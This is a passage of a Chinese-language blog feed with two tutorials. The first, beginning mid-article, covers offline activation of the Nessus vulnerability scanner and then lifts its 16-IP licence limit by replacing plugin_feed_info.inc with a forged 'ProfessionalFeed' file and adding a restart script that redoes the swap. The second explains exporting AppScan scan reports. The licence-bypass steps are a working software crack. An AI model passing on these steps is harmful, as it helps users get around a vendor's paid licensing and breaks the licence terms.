class=\"line\">https://plugins.nessus.org/v2/offline.php</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/dad3f4a3b1804e7e88742ace5246b2f2.png\" alt=\"image.png\"></p>\n<p>5. 得到更新插件地址，及 license 证书</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/c2f6d9b61f25438c838edc005ac099cc.png\" alt=\"image.png\"></p>\n<p>6. 下载更新包，下载证书 nessus.license。</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/045c0b7dccda4006a172bbe12979e312.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9788ef99b5ce4621ae1e644285f43ed2.png\" alt=\"image.png\"></p>\n<p>7. 将下载好的激活证书和插件包复制到 kali</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4f9d3d443be24573a4e003cdad62294d.png\" alt=\"image.png\"></p>\n<p>8. 离线激活 nessus</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/opt/nessus/sbin/nessuscli fetch --register-offline ./nessus.license</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4da74bfab4124d49824c08fabcfbb02f.png\" alt=\"image.png\"></p>\n<p>您的激活码已正确注册 - 谢谢。</p>\n<p>9. 安装插件包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">/opt/nessus/lib/nessus/plugins/  #插件包目录</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3602dbf8e98c41b08e2698986e81f194.png\" alt=\"image.png\"></p>\n<p>10. 重启 nessus</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nessusd restart</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2f8e50f756dd4a4797a7e0f9bc2213fa.png\" alt=\"image.png\"></p>\n<p>11. 重新访问 nessus 网站，等待加载插件【耗时较长，需要耐心等待】</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://192.168.10.141:8834/#/settings/about</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b16c2d94b5d4440b025297ec1f9b6f5.png\" alt=\"image.png\"></p>\n<p>完成后进入 nessus 系统。显示激活成功，具有了 scan 功能。但显示仅允许扫描 16 个 IP。</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b2def339468746fdbd114bed1f43d1d3.png\" alt=\"image.png\"></p>\n<h2 id=\"4解除ip限制\"><a class=\"anchor\" href=\"#4解除ip限制\">#</a> 4. 解除 IP 限制</h2>\n<p>1. 获取当前 plugins 的版本。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://plugins.nessus.org/v2/plugins.php</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3032df10296340a5bcba5e1d51445822.png\" alt=\"image.png\"></p>\n<p>2. 停止 nessus 服务</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nessusd stop</span><br></pre></td></tr></table></figure></p>\n<p>3. 创建 plugin_feed_info.inc</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi plugin_feed_info.inc</span><br></pre></td></tr></table></figure></p>\n<p>内容如下，并将刚刚获取到的版本号替换如下内容中的数字串。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PLUGIN_SET = &quot;202203090609&quot;;</span><br><span class=\"line\">PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;</span><br><span class=\"line\">PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;</span><br></pre></td></tr></table></figure></p>\n<p>4. 将 plugin_feed_info.inc 替换到 /opt/nessus/var/nessus/plugin_feed_info.inc</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp plugin_feed_info.inc /opt/nessus/var/nessus/</span><br></pre></td></tr></table></figure></p>\n<p>5. 将 /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc 文件删除。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc</span><br></pre></td></tr></table></figure></p>\n<p>6. 启动 nessus 服务</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nessusd start</span><br></pre></td></tr></table></figure></p>\n<p>7. 访问 Nessus，windows 打开浏览器，访问 nessus，会看到 nessus 初始化插件，完成后，看设置页面显示 unlimited。表示解除 IP 限制成功。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://192.168.3.47:8834/</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/be568c6057e74ea59f2f4a61bbad1fd2.png\" alt=\"image.png\"></p>\n<h2 id=\"5解决nessus重启失效后遗症\"><a class=\"anchor\" href=\"#5解决nessus重启失效后遗症\">#</a> 5. 解决 Nessus 重启失效后遗症</h2>\n<p>由于 Nessus 服务每次重启后，都会重置 plugin_feed_info.inc，这将会使 nessus/plugins 目录下所有的插件都被删除，无法扫描。因此要将 nessus 服务设置为手动，并且先停止 nessus 服务。可以写成批处理解决此问题</p>\n<p>1. 编写启动脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi qd_nessus.sh</span><br><span class=\"line\"></span><br><span class=\"line\">service nessusd stop;</span><br><span class=\"line\">cp /root/nessus/plugin_feed_info.inc /opt/nessus/var/nessus/;</span><br><span class=\"line\">rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc;</span><br><span class=\"line\">service nessusd start;</span><br></pre></td></tr></table></figure></p>\n<p>每次需要启动 nessus 时 输入启动命令</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh /root/nessus/qd_nessus.sh</span><br></pre></td></tr></table></figure></p>\n<p>2.nessus 命令合集</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#启动</span><br><span class=\"line\">service nessusd start;</span><br><span class=\"line\">#重启</span><br><span class=\"line\">service nessusd restart;</span><br><span class=\"line\">#查看状态</span><br><span class=\"line\">service nessusd status</span><br><span class=\"line\">#停止服务</span><br><span class=\"line\">service nessusd stop</span><br></pre></td></tr></table></figure></p>\n<p>3. 遇到的坑及相应的解决办法</p>\n<p>在解除 ip 限制的过程中，如果已经解除成功，但是新建扫描项目时，发现很快就结束，无扫描结果。此时查看 plugins 目录内容是否被删除。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">du -h /opt/nessus/lib/nessus/plugins</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/e89f232f79234dfabfe2419db15ac273.png\" alt=\"image.png\"></p>\n<p>正常情况下，该目录应该在 1.4G 左右。如远远低于此数值。请按如下步骤操作：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nessusd stop;</span><br><span class=\"line\">/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz</span><br><span class=\"line\">sh qd_nessus.sh</span><br></pre></td></tr></table></figure></p>\n<p>然后打开浏览器，正常访问 nessus。（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmNlbnRvcw==\">https://</span>ip:8843）静待 plugins 更新完成。</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/11/AppScan%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A/",
            "url": "https://mangpumo.github.io/2023/01/11/AppScan%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A/",
            "title": "AppScan扫描报告",
            "date_published": "2023-01-10T21:35:41.000Z",
            "content_html": "<h1 id=\"appscan扫描报告\"><a class=\"anchor\" href=\"#appscan扫描报告\">#</a> AppScan 扫描报告</h1>\n<h2 id=\"1加载扫描结果\"><a class=\"anchor\" href=\"#1加载扫描结果\">#</a> 1. 加载扫描结果</h2>\n<p>1. 点击【打开】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/6113b3be3e3f4823b6e8a3299a4168b2.png\" alt=\"image.png\"></p>\n<p>2. 选择之前保存过的扫描结果</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5a5205ed79b54851b4d2ab9b00e3b94e.png\" alt=\"image.png\"></p>\n<p>3. 等待加载完成</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4cdd51d08f5c48188c7a4c76a2a1af52.png\" alt=\"image.png\"></p>\n<h2 id=\"2领导查看的报告\"><a class=\"anchor\" href=\"#2领导查看的报告\">#</a> 2. 领导查看的报告</h2>\n<p>1. 点击【报告】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/147bde4944b941558a599f08ff29cdde.png\" alt=\"image.png\"></p>\n<p>2. 模板选择为【缺省值】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fda3f723caab4dabb81cee31211c0197.png\" alt=\"image.png\"></p>\n<p>3. 最低严重性选择为【中】，测试类型选择为【应用程序】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/9c78640cace24a498a841f9cb43410bd.png\" alt=\"image.png\"></p>\n<p>4. 点击【布局】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/e41b7307149b430eb2606f0cee651a84.png\" alt=\"image.png\"></p>\n<p>5. 选择【其他徽标】，点击上传徽标</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/df41332deeca4243bd9a9f2b098c50e3.png\" alt=\"image.png\"></p>\n<p>6. 选择徽标，点击打开</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/58c0f0878dd4457bbf97c1ca6fbfae45.png\" alt=\"image.png\"></p>\n<p>7. 修改报告标题，比如输入 【哔哩嘀哩网站安全评估报告】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/c9709b41eff441cab81b66b982fa958a.png\" alt=\"image.png\"></p>\n<p>8. 点击【保存报告】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4a4c6ce4f8b44483be607691b1ca8dc1.png\" alt=\"image.png\"></p>\n<p>9. 选择喜欢的位置保存</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/59d25ea09c1b46169c0a3a6258711bbd.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/2de43fdea3194cd5ac62997e1dc5edaf.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/f0c77212eb8e4e828585f795344b6ab9.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fa4e3bd17c6743f994862de41f0e87eb.png\" alt=\"image.png\"></p>\n<h2 id=\"3其他报告\"><a class=\"anchor\" href=\"#3其他报告\">#</a> 3. 其他报告</h2>\n<p>1. 行业标准报告</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5c7340c0a26f498cbcf4a9feb30a8b65.png\" alt=\"image.png\"></p>\n<p>2. 合规一致性报告</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4812c10f2bd445d6ac3d63e3caae12f8.png\" alt=\"image.png\"></p>\n<p>3. 基于模板报告</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/d7bbb31bea304c5086c93f66a8e4bbda.png\" alt=\"image.png\"></p>\n",
            "tags": []
        }
    ]
}